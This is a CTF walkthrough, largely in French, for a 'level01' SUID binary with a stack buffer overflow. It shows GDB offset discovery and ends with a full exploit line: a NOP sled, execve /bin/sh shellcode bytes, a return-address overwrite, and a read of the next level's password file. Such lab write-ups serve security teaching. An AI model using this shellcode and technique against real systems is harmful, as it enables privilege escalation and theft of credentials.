# Walkthrough - level01

The program contains SUID permissions for the user level02, which will allow us to obtain their flag.

## Disassembly

- Allocation d'un buffer de 64 bytes sur la stack
- Un appel à la fonction `fgets` avec 256 bytes lu sur la stdin
- Un appel à la fonction `fgets` avec 100 bytes lu sur la stin.

## Exploit

L'object est de stocker un shellcode dans le buffer `a_user_name`, puis d'écraser l'EIP de la fonction `main` pour jump directement sur le shellcode.

Premierement, comme on peut le voir dans la fonction `verify_user_name`, il y a un `memcpy(a_user_name, "dat_wil", 7)` qui nous impose d'utiliser le nom d'utilisateur `dat_wil`.

Ensuite, il nous faut calculer l'offset à mettre dans le deuxième `fgets`.

[Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

Ce site genere une string que l'on peut mettre dans le deuxième `fgets` avec GDB afin de provoquer un segfault et de calculer l'offset pour overwrite l'EIP du `main`.

```bash
gdb ./level01
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Si on rendre l'addresse du segfault (`0x37634136`)dans le site, on obtenir un offset de 80 bytes

Maintenant, il nous faut obtenir l'addresse de la variable `a_user_name` pour connaitre l'addresse du shellcode que l'on va injecter.

```bash
gdb ./level01
(gdb) info variables
0x0804a040  a_user_name
```

Il y a la chaine de caracteres `dat_wil` en premier dans `a_user_name` donc notre shellcode se trouvera à l'addresse `0x0804a040 + len("dat_wil") + 1 pour le \0 = 0x0804a048`


Faisons la commande complète, en ajoutant un peu d'instructions NOP "\x90" devant le shellcode pour pouvoir facilement retomber dessus.

```bash
(python -c 'print("dat_wil" + "\x90" * 20 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'; python -c 'print("\x90" * 80 + "\x48\xa0\x04\x08")'; echo "cat /home/users/level02/.pass") | ./level01
```

Shellcode: https://shell-storm.org/shellcode/files/shellcode-752.html